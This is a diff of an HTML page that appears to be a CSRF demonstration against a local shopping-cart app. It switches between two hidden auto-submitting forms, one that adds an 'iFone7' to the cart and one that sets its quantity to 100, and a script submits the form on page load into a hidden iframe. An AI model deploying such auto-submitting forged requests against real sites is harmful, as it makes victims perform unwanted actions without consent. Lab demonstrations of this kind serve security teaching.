@@ -5,22 +5,22 @@
 		<title>CSRF</title>
 	</head>
 	<body>
-		<h1>CSRF - You've been pwned!</h1>
+		<h1 align="center">CSRF - You've been pwned!</h1>
 		<iframe style="display:none" name="frame"></iframe>
 
     <!-- This form will add an iFone7 to the cart  -->
 
-		<!-- <form method="POST" action="http://localhost:8888/php/add-to-cart.php" target="frame" id="form">
+		<form method="POST" action="http://localhost:8888/php/add-to-cart.php" target="frame" id="form">
 			<input type="hidden" name="productType" value="iFone7">
 			<input type="hidden" value="submit">
-		</form> -->
+		</form>
 
     <!-- This form will update the cart with 100 iFone7   -->
 
-    <form method="POST" action="http://localhost:8888/php/update-cart.php" target="frame" id="form">
+    <!-- <form method="POST" action="http://localhost:8888/php/update-cart.php" target="frame" id="form">
       <input type="hidden" name="quantity_iFone7" value="100">
       <input type="hidden" value="submit">
-    </form>
+    </form> -->
 
 		<script>
 			document.getElementById("form").submit()
